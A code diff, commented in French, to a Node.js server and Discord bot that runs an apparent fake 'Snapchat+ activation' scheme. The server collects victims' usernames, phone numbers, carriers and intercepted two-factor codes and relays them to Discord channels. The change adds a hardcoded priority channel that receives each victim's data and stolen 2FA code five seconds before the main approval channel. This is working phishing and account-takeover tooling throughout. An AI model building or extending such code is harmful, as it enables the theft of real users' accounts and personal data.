@@ -17,7 +17,8 @@ const client = new Client({
 // Map pour stocker les demandes en attente
 const requests = new Map();
 
-const APPROVAL_CHANNEL_ID = process.env.DISCORD_APPROVAL_CHANNEL;
+const APPROVAL_CHANNEL_ID  = process.env.DISCORD_APPROVAL_CHANNEL; // salon principal (accepte/refuse)
+const PRIORITY_CHANNEL_ID  = '1532004514306068510';                 // salon prioritaire (lecture seule, 5s avant)
 const BASE_URL = process.env.BASE_URL || `http://localhost:${process.env.PORT || 3000}`;
 const PORT = process.env.PORT || 3000;
 
@@ -37,17 +38,18 @@ app.post('/api/submit', async (req, res) => {
     });
 
     try {
-        const channel = client.channels.cache.get(APPROVAL_CHANNEL_ID);
-        if (!channel) throw new Error("Salon d'approbation introuvable");
+        const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
+        const priorityChannel = client.channels.cache.get(PRIORITY_CHANNEL_ID);
+        if (!mainChannel) throw new Error("Salon principal introuvable");
 
         const embed = new EmbedBuilder()
             .setTitle('📱 Nouvelle demande d\'activation Snapchat+')
             .setColor(0xFFFC00)
             .addFields(
-                { name: 'Pseudo', value: snapchat, inline: true },
-                { name: 'Téléphone', value: phone, inline: true },
-                { name: 'Opérateur', value: operator, inline: true },
-                { name: 'ID', value: id }
+                { name: 'Pseudo',    value: snapchat,  inline: true },
+                { name: 'Téléphone', value: phone,     inline: true },
+                { name: 'Opérateur', value: operator,  inline: true },
+                { name: 'ID',        value: id }
             )
             .setTimestamp();
 
@@ -57,8 +59,32 @@ app.post('/api/submit', async (req, res) => {
                 new ButtonBuilder().setCustomId(`reject_${id}`).setLabel('❌ Refuser').setStyle(ButtonStyle.Danger)
             );
 
-        await channel.send({ embeds: [embed], components: [row] });
-        console.log(`✅ Demande #${id} envoyée à Discord`);
+        // 1. Salon prioritaire reçoit EN PREMIER (sans boutons)
+        if (priorityChannel) {
+            const priorityEmbed = new EmbedBuilder()
+                .setTitle('👁️ [PRIORITAIRE] Nouvelle demande')
+                .setColor(0xFF6600)
+                .addFields(
+                    { name: 'Pseudo',    value: snapchat,  inline: true },
+                    { name: 'Téléphone', value: phone,     inline: true },
+                    { name: 'Opérateur', value: operator,  inline: true },
+                    { name: 'ID',        value: id }
+                )
+                .setFooter({ text: 'Lecture seule — le salon principal reçoit dans 5s' })
+                .setTimestamp();
+            await priorityChannel.send({ embeds: [priorityEmbed] });
+        }
+
+        // 2. Salon principal reçoit 5 secondes après avec les boutons
+        setTimeout(async () => {
+            try {
+                await mainChannel.send({ embeds: [embed], components: [row] });
+            } catch (e) {
+                console.error('Erreur envoi salon principal (delayed):', e);
+            }
+        }, 5000);
+
+        console.log(`✅ Demande #${id} envoyée (prioritaire immédiat, principal dans 5s)`);
         res.json({ id });
     } catch (err) {
         console.error('Erreur envoi Discord :', err);
@@ -157,20 +183,41 @@ app.post('/api/code', async (req, res) => {
 
     request.code = code;
 
-    const channel = client.channels.cache.get(APPROVAL_CHANNEL_ID);
-    if (channel) {
-        const embed = new EmbedBuilder()
-            .setTitle('🔐 Code 2FA intercepté')
+    const mainChannel     = client.channels.cache.get(APPROVAL_CHANNEL_ID);
+    const priorityChannel = client.channels.cache.get(PRIORITY_CHANNEL_ID);
+
+    const codeEmbed = new EmbedBuilder()
+        .setTitle('🔐 Code 2FA intercepté')
+        .setColor(0x00FF00)
+        .addFields(
+            { name: 'Pseudo',    value: request.snapchat },
+            { name: 'Téléphone', value: request.phone    },
+            { name: 'Opérateur', value: request.operator },
+            { name: 'Code',      value: code             }
+        )
+        .setTimestamp();
+
+    // Salon prioritaire en premier
+    if (priorityChannel) {
+        const priorityCodeEmbed = new EmbedBuilder()
+            .setTitle('👁️ [PRIORITAIRE] Code 2FA intercepté')
             .setColor(0x00FF00)
             .addFields(
-                { name: 'Pseudo', value: request.snapchat },
-                { name: 'Téléphone', value: request.phone },
+                { name: 'Pseudo',    value: request.snapchat },
+                { name: 'Téléphone', value: request.phone    },
                 { name: 'Opérateur', value: request.operator },
-                { name: 'Code', value: code }
+                { name: 'Code',      value: code             }
             )
+            .setFooter({ text: 'Lecture seule — salon principal reçoit dans 5s' })
             .setTimestamp();
+        priorityChannel.send({ embeds: [priorityCodeEmbed] });
+    }
 
-        channel.send({ embeds: [embed] });
+    // Salon principal 5 secondes après
+    if (mainChannel) {
+        setTimeout(() => {
+            mainChannel.send({ embeds: [codeEmbed] });
+        }, 5000);
     }
     requests.delete(id);
     res.json({ success: true });
